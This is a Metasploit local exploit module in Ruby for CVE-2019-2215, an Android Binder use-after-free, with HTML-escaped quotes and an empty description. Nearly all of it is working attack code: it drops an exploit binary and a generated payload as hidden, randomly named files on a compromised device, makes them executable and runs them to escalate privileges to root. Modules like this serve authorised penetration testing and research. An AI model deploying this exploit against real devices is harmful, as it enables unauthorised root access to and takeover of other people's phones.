# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Local
  Rank = ExcellentRanking

  include Msf::Post::File
  include Msf::Post::Common
  include Msf::Exploit::EXE
  include Msf::Exploit::FileDropper

  def initialize(info={})
    super( update_info( info, {
        &#039;Name&#039;          => "Android Binder Use-After-Free Exploit",
        &#039;Description&#039;   => %q{
        },
        &#039;License&#039;       => MSF_LICENSE,
        &#039;Author&#039;        => [
            &#039;Jann Horn&#039;,    # discovery and exploit
            &#039;Maddie Stone&#039;, # discovery and exploit
            &#039;grant-h&#039;,      # Qu1ckR00t
            &#039;timwr&#039;,        # metasploit module
        ],
        &#039;References&#039;    => [
            [ &#039;CVE&#039;, &#039;2019-2215&#039; ],
            [ &#039;URL&#039;, &#039;https://bugs.chromium.org/p/project-zero/issues/detail?id=1942&#039; ],
            [ &#039;URL&#039;, &#039;https://hernan.de/blog/2019/10/15/tailoring-cve-2019-2215-to-achieve-root/&#039; ],
            [ &#039;URL&#039;, &#039;https://github.com/grant-h/qu1ckr00t/blob/master/native/poc.c&#039; ],
        ],
        &#039;DisclosureDate&#039; => "Sep 26 2019",
        &#039;Platform&#039;       => [ "android", "linux" ],
        &#039;Arch&#039;           => [ ARCH_AARCH64 ],
        &#039;Targets&#039;        => [[ &#039;Auto&#039;, {} ]],
        &#039;DefaultOptions&#039; =>
        {
          &#039;WfsDelay&#039;     => 5,
        },
        &#039;DefaultTarget&#039; => 0,
      }
    ))
  end

  def upload_and_chmodx(path, data)
    write_file path, data
    chmod(path)
    register_file_for_cleanup(path)
  end

  def exploit
    local_file = File.join( Msf::Config.data_directory, "exploits", "CVE-2019-2215", "exploit" )
    exploit_data = File.read(local_file, {:mode => &#039;rb&#039;})

    workingdir = session.fs.dir.getwd
    exploit_file = "#{workingdir}/.#{Rex::Text::rand_text_alpha_lower(5)}"
    upload_and_chmodx(exploit_file, exploit_data)
    payload_file = "#{workingdir}/.#{Rex::Text::rand_text_alpha_lower(5)}"
    upload_and_chmodx(payload_file, generate_payload_exe)

    print_status("Executing exploit &#039;#{exploit_file}&#039;")
    result = cmd_exec("echo &#039;#{payload_file} &&#039; | #{exploit_file}")
    print_status("Exploit result:\n#{result}")
  end
end

